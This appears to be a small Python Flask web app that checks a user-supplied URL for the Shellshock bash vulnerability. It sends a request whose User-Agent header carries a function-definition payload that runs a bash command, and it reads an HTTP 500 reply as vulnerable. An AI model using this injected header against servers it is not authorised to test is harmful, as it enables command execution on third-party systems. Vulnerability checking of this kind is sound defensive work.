# coding: utf-8

from flask import Flask, render_template, request
import urllib2
app = Flask(__name__)



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check/', methods=['GET','POST'])
def check():
    msg = ''
    status = False
    if request.method == 'POST':
    	req = urllib2.Request(request.form['url_check'], headers={ 'User-Agent': '() { :;}; /bin/bash -c "ls"' })
	try:
		res = urllib2.urlopen(req)
	        status = False
	except IOError as e:
		if e.code == 500:
		    status = True
		else:
		    msg = u'خطا در ارسال ورودی'
	except ValueError as e:
		msg = u'آدرس وارد شده معتبر نیست'
	except:
		msg = u'خطایِ نامشخص!'		
    return render_template('check.html', status = status, msg = msg)


if __name__ == '__main__':
    app.run(debug=True)
